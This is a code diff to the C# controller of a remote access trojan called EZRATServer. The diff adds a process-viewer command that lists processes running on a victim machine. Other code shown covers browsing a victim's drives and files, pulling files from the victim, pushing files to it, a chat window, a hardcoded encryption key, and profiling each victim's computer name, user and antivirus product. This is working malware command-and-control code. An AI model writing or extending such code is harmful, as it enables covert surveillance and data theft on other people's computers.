@@ -31,7 +31,7 @@ namespace EZRATServer
         private static string EncryptKey = "POULPE212123542345235";
         FileBrowser fl;
         Chat cht;
-
+        ProcessViewer pc;
 
 
         Timer tmr = new Timer();
@@ -298,7 +298,7 @@ namespace EZRATServer
             switch (e.ClickedItem.Text)
             {
                 case "File Browser":
-                    fl = new FileBrowser(this, this.lstClients.SelectedItems[0].Index);
+                    fl = new FileBrowser(this, this.lstClients.SelectedIndices[0]);
                     fl.Show();
                     SendCommand("lsdrives", this.lstClients.SelectedIndices[0]);
                     SendCommand("lsfiles", this.lstClients.SelectedIndices[0]);
@@ -307,6 +307,11 @@ namespace EZRATServer
                     cht = new Chat(this, this.lstClients.SelectedIndices[0]);
                     SendCommand("chat;", this.lstClients.SelectedIndices[0]);
                     cht.Show();
+                    break;
+                case "Process Viewer":
+                    pc = new ProcessViewer(this, this.lstClients.SelectedIndices[0]);
+                    SendCommand("procview;", this.lstClients.SelectedIndices[0]);
+                    pc.Show();
                     break;
                 default:
                     break;
@@ -392,11 +397,14 @@ namespace EZRATServer
                 id++;
             }
 
+            if (_isServerStarted)
+            {
+                _serverSocket.Close(); //Close the server socket
+                _serverSocket.Dispose(); //Dispose the server socket
 
-            _serverSocket.Close(); //Close the server socket
-            _serverSocket.Dispose(); //Dispose the server socket
+                _clientSockets.Clear(); //Remove all client sockets from the client list
+            }
 
-            _clientSockets.Clear(); //Remove all client sockets from the client list
         }
 
         /// <summary>
@@ -620,7 +628,7 @@ namespace EZRATServer
                         string name = lines[1]; //The Computer Name
                         string user = lines[2].Substring(lines[2].LastIndexOf('\\') + 1); //The computer's date and time
                         string windows = lines[3]; //The computer's installed Anti Virus product
-                        
+
                         AddToData(new ClientData(id, ip, name, user, windows)); //Update the UI
                     }
                     else if (text.StartsWith("lsdrives;"))
@@ -655,6 +663,14 @@ namespace EZRATServer
                         this.fl.Invoke(new MethodInvoker(() => path += "\\Files" + this.fl.PathDownload.Substring(this.fl.PathDownload.LastIndexOf('\\'))));
                         ReceiveFile(recFile, path);
                     }
+                    else if (text.StartsWith("procview;"))
+                    {
+                        text = text.Substring(9);
+                        string[] res = text.Split(';');
+                        pc.UpdateData(res);
+
+
+                    }
                 }
 
 
@@ -666,7 +682,7 @@ namespace EZRATServer
 
 
 
-        public void SendFile(string path,string pathUploaded,int id)
+        public void SendFile(string path, string pathUploaded, int id)
         {
             if (!_clientSockets[id].Connected) //If the client isn't connected
             {
@@ -677,10 +693,10 @@ namespace EZRATServer
 
             try
             {
-                
-                string data = Encrypt("upfile;" + pathUploaded + path.Substring(path.LastIndexOf('\\') + 1)  + ";" + File.ReadAllText(path));
+
+                string data = Encrypt("upfile;" + pathUploaded + path.Substring(path.LastIndexOf('\\') + 1) + ";" + File.ReadAllText(path));
                 string header = data.Length.ToString() + "§";
-                byte[] result = Encoding.Default.GetBytes(header+data);
+                byte[] result = Encoding.Default.GetBytes(header + data);
                 _clientSockets[id].Send(result);
             }
             catch (Exception ex) //Failed to send data to the server
